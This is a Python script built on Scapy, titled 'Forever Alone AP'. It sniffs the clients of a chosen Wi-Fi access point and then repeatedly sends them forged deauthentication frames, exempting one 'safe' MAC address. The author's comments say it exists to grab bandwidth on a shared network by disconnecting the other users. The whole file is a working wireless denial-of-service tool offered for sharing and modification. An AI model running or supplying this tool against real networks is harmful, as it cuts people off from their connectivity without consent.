#!/usr/bin/env python
#Author: @hcjuan04
# =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ FOREVER ALONE AP =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
# I wrote this just because I need wide broadband in shared WLAN !!
# So how it works!
# Requirements: Debian core OS, Python and Scapy.
# This script sends deauthentication packets towards the clients connected to a specific AP
#
# How to Run it:
# FAAP.py BSSID interface channel safe_STA
#####BSSID = BSSID u r connected to - AP
#####interface: a monitor interface capable of inject traffic
#####Channel: the frequency channel the AP is working on
#####safe_STA: the client MAC address
# Feel free of share and modify

import sys, os, signal
from multiprocessing import Process
from scapy.all import *
interface = ""
observedclients = []
BSSID='' # BSSID to F*ck
interface='' # monitor interface
Channel ='' # BSSID channel
safe = '' # Safe STA

def sniffmgmt(p):
	# if packet has 802.11 layer, and type of packet is Data frame
	if p.haslayer(Dot11) and p.type == 2:
		if p.addr3 == BSSID:
			if p.addr2 not in observedclients:
				observedclients.append(p.addr2)
				print "[+] %s" %(p.addr2)

# Deauthentication method
def deauth(bssid, client, count):
	pckt = Dot11(subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
	cli_to_ap_pckt = None
	if client != 'FF:FF:FF:FF:FF:FF' : 
		cli_to_ap_pckt = Dot11(subtype=12, addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
	print 'Sending Deauth to ' + client + ' from ' + bssid
	if not count: 
		print 'Press CTRL+C to quit'
	while count != 0:
		try:
			for i in range(4):
				# Send out deauth from the AP
				send(pckt)
				if client != 'FF:FF:FF:FF:FF:FF': 
					send(cli_to_ap_pckt)
			count -= 1
		except KeyboardInterrupt:
			break


def main() :
    
    try :
	while True:
		
		# Set channel
		global observedclients
		if observedclients != [] :
			observedclients = []
		os.system("iw dev %s set channel %s" % (interface, Channel))
		# Get Clients
		print "==================Forever Alone AP========================="
		print "***************Clients From: %s *********" %(BSSID)
		sniff(iface=interface, prn=sniffmgmt, timeout=25)
		print observedclients
		print "++++++++++++++++++Sending Deauth ++++++++++++++++++++++++++"
		if observedclients != [] :
			x=len(observedclients)
			while (x > 0) :
				if observedclients[x-1] != safe:
					conf.iface = interface
					deauth(BSSID, observedclients[x-1], 1)
			
				x=x-1
		print observedclients
		time.sleep(5) #Wait
		
    except KeyboardInterrupt:
    	    print "FAAP terminated"



if __name__ == "__main__":
	if len(sys.argv) != 5:
		print "Usage python %s BSSID interface channel safe_STA" % sys.argv[0]
        	sys.exit(1)
	BSSID = sys.argv[1]
	interface = sys.argv[2]
	Channel = sys.argv[3]
	safe = sys.argv[4]
	print "%s : %s : %s " % (BSSID, interface, Channel)
	main()
